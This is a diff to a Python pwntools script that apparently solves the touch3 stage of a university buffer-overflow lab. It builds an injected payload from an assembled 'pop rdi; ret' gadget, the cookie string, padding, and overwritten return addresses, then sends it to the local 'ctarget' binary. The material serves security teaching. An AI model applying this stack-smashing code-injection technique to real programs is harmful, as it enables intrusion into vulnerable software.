@@ -41,4 +41,19 @@ payload = pop_rdi_ret + junk + set_p64(input_buf_addr) + set_p64(cookie) + set_p
 p.sendline(payload)
 print(str(p.recv(), "ascii"))
 
-# p = process(ctarget)
+# touch 3
+p = process(ctarget)
+input("# touch3")
+
+cookie_str = "59b997fa\0"
+pop_rdi_ret = asm("""pop rdi
+                    ret""").decode("iso-8859-1")
+junk = "a" * (junk_size - len(pop_rdi_ret) - len(cookie_str))
+
+cookie_str_addr = input_buf_addr + len(pop_rdi_ret)
+payload = pop_rdi_ret + cookie_str + junk + set_p64(input_buf_addr) + set_p64(cookie_str_addr) + set_p64(touch3)
+
+print(payload)
+
+p.sendline(payload)
+print(str(p.recv(), "ascii"))
